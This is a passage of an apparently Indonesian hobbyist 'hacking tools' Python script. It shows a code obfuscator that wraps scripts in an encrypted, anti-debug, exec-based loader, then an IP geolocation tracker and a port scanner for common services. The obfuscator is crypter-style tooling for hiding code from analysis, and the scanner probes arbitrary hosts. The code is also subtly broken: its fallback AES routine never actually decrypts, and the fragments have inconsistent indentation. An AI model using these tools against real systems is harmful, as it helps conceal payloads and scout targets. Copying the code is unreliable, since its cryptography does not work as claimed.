            f"{v_temp[35]}={v_hmac}.new({v_temp[34]},{v_temp[28]},{v_hashlib}.sha256).digest()",
            f"if {v_temp[26]}!={v_temp[35]}:raise SystemExit({self._obf_str_to_chrexpr('HMAC verification failed')})",
        ])

        sbox_vals = ','.join(str(x) for x in [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16])
        aes_decrypt_lines = [
            "try:",
            f"    from Crypto.Cipher import AES",
            f"    from Crypto.Util.Padding import unpad",
            f"    {v_temp[36]}={v_temp[28]}[:{self._obf_int(16)}]",
            f"    {v_temp[37]}={v_temp[28]}[{self._obf_int(16)}:]",
            f"    {v_temp[38]}=AES.new({v_temp[32]},AES.MODE_CBC,{v_temp[36]})",
            f"    {v_temp[29]}=unpad({v_temp[38]}.decrypt({v_temp[37]}),AES.block_size)",
            "except ImportError:",
            f"    {v_temp[36]}={v_temp[28]}[:{self._obf_int(16)}]",
            f"    {v_temp[37]}={v_temp[28]}[{self._obf_int(16)}:]",
            f"    _sb=[{sbox_vals}]",
            f"    _rc=[0x01000000,0x02000000,0x04000000,0x08000000,0x10000000,0x20000000,0x40000000,0x80000000,0x1b000000,0x36000000]",
            f"    {v_temp[38]}=[]",
            f"    for i in range({self._obf_int(4)}):",
            f"        {v_temp[38]}.append(int.from_bytes({v_temp[32]}[{self._obf_int(4)}*i:{self._obf_int(4)}*i+{self._obf_int(4)}],{obf_big}))",
            f"    for i in range({self._obf_int(4)},{self._obf_int(44)}):",
            f"        temp={v_temp[38]}[i-{self._obf_int(1)}]",
            f"        if i%{self._obf_int(4)}=={self._obf_int(0)}:",
            f"            temp=((temp<<{self._obf_int(8)})|(temp>>{self._obf_int(24)}))&{self._obf_int(0xffffffff)}",
            f"            temp=(_sb[(temp>>24)&0xff]<<24)|(_sb[(temp>>16)&0xff]<<16)|(_sb[(temp>>8)&0xff]<<8)|_sb[temp&0xff]",
            f"            temp^=_rc[(i//{self._obf_int(4)})-1] if (i//{self._obf_int(4)})-1<len(_rc) else 0",
            f"        {v_temp[38]}.append({v_temp[38]}[i-{self._obf_int(4)}]^temp)",
            f"    {v_temp[39]}=bytearray()",
            f"    prev={v_temp[36]}",
            f"    for i in range({self._obf_int(0)},len({v_temp[37]}),{self._obf_int(16)}):",
            f"        block={v_temp[37]}[i:i+{self._obf_int(16)}]",
            f"        decrypted=list(block)",
            f"        {v_temp[39]}.extend(bytes(a^b for a,b in zip(decrypted,prev)))",
            f"        prev=block",
            f"    {v_temp[29]}=bytes({v_temp[39]})",
            f"    padding={v_temp[29]}[-{self._obf_int(1)}]",
            f"    {v_temp[29]}={v_temp[29]}[:-padding]",
        ]
        decoder_steps.extend(aes_decrypt_lines)

        # Inject BLAKE2b integrity check + ChaCha20 decrypt (new layers)
        # Urutan BENAR:
        #   Encode: plaintext → BLAKE2(plaintext) → ChaCha_encrypt → [tag | ciphertext]
        #   Decode: [tag | ciphertext] → strip tag → ChaCha_decrypt → BLAKE2(result) == tag?
        blake2_tag_var  = self._quantum_name(7)
        blake2_ciph_var = self._quantum_name(7)
        blake2_verify_var = self._quantum_name(7)

        # Step 1: strip tag dan ciphertext
        decoder_steps.extend([
            f"{blake2_tag_var}={v_temp[29]}[:{self._obf_int(32)}]",
            f"{blake2_ciph_var}={v_temp[29]}[{self._obf_int(32)}:]",
        ])

        # Step 2: ChaCha decrypt ciphertext
        chacha_lines, v_after_chacha = self._chacha_runtime_code(blake2_ciph_var, chacha_key_hex, chacha_nonce_hex)
        decoder_steps.extend(chacha_lines)

        # Step 3: Verifikasi BLAKE2 dari plaintext hasil decrypt
        decoder_steps.extend([
            f"{blake2_verify_var}=__import__({self._obf_str_to_chrexpr('hashlib')}).blake2b({v_after_chacha},digest_size={self._obf_int(32)}).digest()",
            f"if {blake2_tag_var}!={blake2_verify_var}:raise SystemExit({self._obf_str_to_chrexpr('IntegrityFailed')})",
        ])
        # v_temp[29] sekarang plaintext hasil ChaCha decrypt
        v_temp[29] = v_after_chacha

        demutate_lines, demutated_var = self._demutate_code(v_temp[29], mutation_key_hex)
        decoder_steps.extend(demutate_lines)

        if is_marshal:
            exec_lines = [
                "try:",
                f"    {v_temp[24]}={v_marshal}.loads({demutated_var})",
                f"    {self._indirect_exec(v_temp[24])}",
                f"except Exception as {v_temp[25]}:",
                "    try:",
                f"        {self._indirect_exec(f'{demutated_var}.decode({obf_utf8})')}",
                f"    except:",
                f"        raise SystemExit({self._obf_str_to_chrexpr('Execution failed')})",
            ]
        else:
            exec_lines = [
                "try:",
                f"    {self._indirect_exec(f'{demutated_var}.decode({obf_utf8})')}",
                f"except:",
                f"    raise SystemExit({self._obf_str_to_chrexpr('Execution failed')})",
            ]

        fake_imports    = self._create_fake_imports()
        nested_exec     = self._build_nested_exec(decoder_steps, exec_lines, v_antidebug, antidebug_checks, v_temp)

        template = f'''#!/usr/bin/env python3
{chr(10).join(fake_imports)}
class {v_class}:
    def __init__(self):
        self.{v_init}={self._obf_int(random.randint(100000,999999))}
        self.{v_verify}()
    def {v_verify}(self):
{chr(10).join(['        '+check for check in integrity_checks])}
{chr(10).join(['        '+p for p in opaque_preds])}
    def {v_decode}(self):
{chr(10).join(['        '+line for line in nested_exec])}
    def {v_exec}(self):
        self.{v_decode}()
{chr(10).join(death_traps)}
{chr(10).join(fake_decoders)}
{chr(10).join(fake_vm_lines)}
{chr(10).join(multilayer_noise)}
if __name__=='__main__':
    {v_temp[24]}={v_class}()
    {v_temp[24]}.{v_exec}()
'''
        return template

   print(f"{W}╭─────────────────────────────────────────────────────────────────────╮")
   print(f"{W}│ Masukkan {G}path{W} file Python yang mau diobfuscate")
   print(f"{W}│ Contoh {R}:{W} /sdcard/folder/script.py")
   print(f"{W}╰─────────────────────────────────────────────────────────────────────╯{N}")

   input_file = input(f"{U}❯❯❯{W} Masukkan path file{G}❯{W} ").strip()

   if not input_file:
        print(f"\n{W}[ {R}?{W} ] Path tidak boleh kosong!{N}")
        input(f"\n{W}Tekan Enter untuk kembali...{N}")
        return

   if not os.path.exists(input_file):
        print(f"\n{W}[ {R}?{W} ] File tidak ditemukan!{N}")
        input(f"\n{W}Tekan Enter untuk kembali...{N}")
        return

   if not input_file.endswith('.py'):
        print(f"\n{W}[ {R}?{W} ] File harus berekstensi .py{N}")
        input(f"\n{W}Tekan Enter untuk kembali...{N}")
        return

   output_dir = "/sdcard/Obfuscate_python"
    
   try:
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        test_file = os.path.join(output_dir, ".test")
        with open(test_file, 'w') as f:
            f.write("test")
        os.remove(test_file)
        print(f"{W} Output dir {R}❯{W} {output_dir}{N}")
   except:
       output_dir = os.path.join(os.path.expanduser("~"), "storage", "Obfuscate_python")
       try:
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)
            print(f"{W} Output dir {R}❯{W} {output_dir}{N}")
       except:
            output_dir = "./Obfuscate_python"
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)
            print(f"{W} Output dir {R}❯{W} {output_dir} (lokal){N}")

   nama_file = os.path.basename(input_file).replace('.py', '') + '_obf.py'
   output_file = os.path.join(output_dir, nama_file)

   print(f"\n{W} Input {R}❯{W} {input_file}{N}")
   print(f"{W} Output {R}❯{W} {output_file}{N}")

   print(f"\n{W}[ {Y}✦{W} ] Membaca file...{N}")
   with open(input_file, 'r', encoding='utf-8') as f:
        source = f.read()

   print(f"{W}[ {G}✦{W} ] Mengobfuscate...{N}")

   stop_loading = threading.Event()
   t = threading.Thread(target=load_bar, args=(stop_loading, "Mengobfuscate file (memakan waktu)"))
   t.daemon = True
   t.start()

   try:
        obf = AdvancedObfuscator()
        obfuscated = obf.obfuscate(source)

        stop_loading.set()
        t.join()

        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(obfuscated)

        original_size = os.path.getsize(input_file) / 1024
        obfuscated_size = os.path.getsize(output_file) / 1024

        print(f"\n{W}╭─────────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {G}✓{W} Obfuscate Selesai!{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {W}File Asli    {R}: {G}{original_size:.2f} KB{N}")
        print(f"{W}│ {W}File Obf    {R}: {G}{obfuscated_size:.2f} KB{N}")
        print(f"{W}│ {W}Lokasi      {R}: {G}{output_dir}{N}")
        print(f"{W}│ {W}File Output {R}: {G}{nama_file}{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────────╯")

        if os.path.exists(output_file):
            print(f"\n{W}[ {G}!{W} ] File berhasil disimpan di {output_file}{N}")
        else:
            print(f"\n{W}[ {R}??{W} ] File gagal disimpan!{N}")

   except Exception as e:
        stop_loading.set()
        t.join()
        print(f"\n{R}✗ Error: {e}{N}")

   input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_ip_tracker():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    N = '\033[0m'
    
    ascii_ip = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_ip}" | lolcat 2>/dev/null || echo "{ascii_ip}"')
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}:{G}IP Tracker
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭─────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan {G}IP Address{W} atau {G}Domain{W} yang mau dilacak{N}")
    print(f"{W}│ Contoh {G}:{W} 8.8.8.8  atau  google.com{N}")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    
    target = input(f"{W}╰──{G}❯{W} ").strip()
    
    if not target:
        print(f"\n{R}✗ IP/Domain tidak boleh kosong!{N}")
        input(f"\n{W}Tekan Enter untuk kembali...{N}")
        return
    
    is_domain = False
    if not target.replace('.', '').replace(':', '').isdigit():
        is_domain = True
        target = target.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
    
    def load_bar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Melacak IP Address [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar, args=(stop_loading,))
    loading_thread.daemon = True
    loading_thread.start()
    
    time.sleep(1.5)
    
    try:
        ip_target = target
        if is_domain:
            try:
                import socket
                ip_target = socket.gethostbyname(target)
            except:
                ip_target = target
        
        url = f"http://ip-api.com/json/{ip_target}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        response = requests.get(url, timeout=10)
        data = response.json()
        
        stop_loading.set()
        loading_thread.join()
        
        if data.get('status') == 'fail':
            print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {R}✗{W} Gagal: {data.get('message', 'IP tidak valid')}{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────╯")
        else:
            ip_query = data.get('query', 'Tidak Tersedia')
            status = 'Valid' if data.get('status') == 'success' else 'Tidak Valid'
            country = data.get('country', 'Tidak Tersedia')
            country_code = data.get('countryCode', 'Tidak Tersedia')
            continent = data.get('continent', 'Tidak Tersedia')
            continent_code = data.get('continentCode', 'Tidak Tersedia')
            region = data.get('region', 'Tidak Tersedia')
            region_name = data.get('regionName', 'Tidak Tersedia')
            city = data.get('city', 'Tidak Tersedia')
            district = data.get('district') or 'Tidak Tersedia'
            zip_code = data.get('zip') or 'Tidak Tersedia'
            lat = data.get('lat', 'Tidak Tersedia')
            lon = data.get('lon', 'Tidak Tersedia')
            timezone = data.get('timezone', 'Tidak Tersedia')
            offset = data.get('offset', 'Tidak Tersedia')
            currency = data.get('currency', 'Tidak Tersedia')
            isp = data.get('isp', 'Tidak Tersedia')
            org = data.get('org', 'Tidak Tersedia')
            as_num = data.get('as', 'Tidak Tersedia')
            as_name = data.get('asname', 'Tidak Tersedia')
            reverse = data.get('reverse') or 'Tidak Tersedia'
            is_mobile = 'Ya' if data.get('mobile') else 'Tidak'
            is_proxy = 'Ya' if data.get('proxy') else 'Tidak'
            is_hosting = 'Ya' if data.get('hosting') else 'Tidak'
            
            print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {G}✓{W} IP Address Ditemukan!{N}")
            if is_domain:
                print(f"{W}│ {W}Domain       {R}: {G}{target}{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────┤")
            print(f"{W}│ {W}IP Address   {R}: {G}{ip_query}{N}")
            print(f"{W}│ {W}Status       {R}: {G}{status}{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────┤")
            print(f"{W}│ {G}━━━ LOKASI ━━━{N}")
            print(f"{W}│ {W}Negara       {R}: {G}{country} ({country_code}){N}")
            print(f"{W}│ {W}Benua        {R}: {G}{continent} ({continent_code}){N}")
            print(f"{W}│ {W}Region       {R}: {G}{region_name} ({region}){N}")
            print(f"{W}│ {W}Kota         {R}: {G}{city}{N}")
            if district != 'Tidak Tersedia':
                print(f"{W}│ {W}Distrik      {R}: {G}{district}{N}")
            if zip_code != 'Tidak Tersedia':
                print(f"{W}│ {W}Kode Pos     {R}: {G}{zip_code}{N}")
            print(f"{W}│ {W}Latitude     {R}: {G}{lat}{N}")
            print(f"{W}│ {W}Longitude    {R}: {G}{lon}{N}")
            print(f"{W}│ {W}Maps         {R}: {G}https://maps.google.com/?q={lat},{lon}{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────┤")
            print(f"{W}│ {G}━━━ WAKTU ━━━{N}")
            print(f"{W}│ {W}Timezone     {R}: {G}{timezone}{N}")
            print(f"{W}│ {W}UTC Offset   {R}: {G}{offset}{N}")
            print(f"{W}│ {W}Mata Uang    {R}: {G}{currency}{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────┤")
            print(f"{W}│ {G}━━━ JARINGAN ━━━{N}")
            print(f"{W}│ {W}ISP          {R}: {G}{isp}{N}")
            print(f"{W}│ {W}Organisasi   {R}: {G}{org}{N}")
            print(f"{W}│ {W}AS           {R}: {G}{as_num}{N}")
            print(f"{W}│ {W}AS Nama      {R}: {G}{as_name}{N}")
            if reverse != 'Tidak Tersedia':
                print(f"{W}│ {W}Reverse DNS  {R}: {G}{reverse}{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────┤")
            print(f"{W}│ {G}━━━ FLAG ━━━{N}")
            print(f"{W}│ {W}Mobile       {R}: {G}{is_mobile}{N}")
            print(f"{W}│ {W}Proxy/VPN    {R}: {G}{is_proxy}{N}")
            print(f"{W}│ {W}Hosting      {R}: {G}{is_hosting}{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────╯")
            
    except requests.exceptions.Timeout:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Timeout! Server tidak merespons.{N}")
    except requests.exceptions.ConnectionError:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Gagal terhubung ke server!{N}")
    except Exception as e:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Error: {e}{N}")
    
    input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_port_scanner():
    play_menu_sound()
    import os, sys, time, socket, threading
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    N = '\033[0m'
    
    ascii_port = """
⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠
⠸⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿
⠀⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⡇
⠀⢻⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⠁
⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⡀⠀⠈⠹⣿⣿⣿⣿⣿⣿⡷⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠙⠻⣿⣿⣿⡇⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠙⠻⠀⠀⠀
⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀
⠀⠀⠀⠀⢿⣿⣿⣿⡟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠹⣿⡿⢛⣿⣿⣿⣿⡇⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⡂⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠀⠉⠀⣸⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣷⣦⣄⣀⣈⠛⠿⣿⣿⣿⣿⠟⣉⣁⣀⠀⣰⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
    os.system(f'echo "{ascii_port}" | lolcat')
    print(f"""
{W}╭────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}:{G}Port Scanner
{W}╰────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan {G}IP Address{W} atau {G}Domain{W} yang mau di scan{N}")
    print(f"{W}│ Contoh {G}:{W} 172.217.194.100{N}")
    print(f"{W}╰────────────────────────────────────────────────────────────────╯{N}")
    target = input(f"{W}╰──{G}❯{W} ").strip()
    
    if not target:
        print(f"\n{R}✗ Target tidak boleh kosong!{N}")
        time.sleep(2)
        return
    
    is_domain = False
    if not target.replace('.', '').isdigit():
        is_domain = True
        target = target.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
    
    print(f"\n{G}✓ Target: {C}{target}{N}")
    
    ip_target = target
    if is_domain:
        try:
            ip_target = socket.gethostbyname(target)
            print(f"{G}✓ Domain: {C}{target} {W}→ {G}IP: {C}{ip_target}{N}")
        except:
            print(f"\n{R}✗ Gagal resolve domain {target}!{N}")
            time.sleep(2)
            return
    
    print(f"\n{G}✓ Scanning IP: {C}{ip_target}{N}")
    
    ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 111: "RPCbind",
        135: "MSRPC", 139: "NetBIOS", 143: "IMAP", 443: "HTTPS",
        445: "SMB", 993: "IMAPS", 995: "POP3S", 1433: "MSSQL",
        1521: "Oracle", 1723: "PPTP", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
        8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB"
    }
    
    def load_bar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Scanning Port [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    def scan_port(port, results):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip_target, port))
            sock.close()
            if result == 0:
                service = ports.get(port, "Unknown")
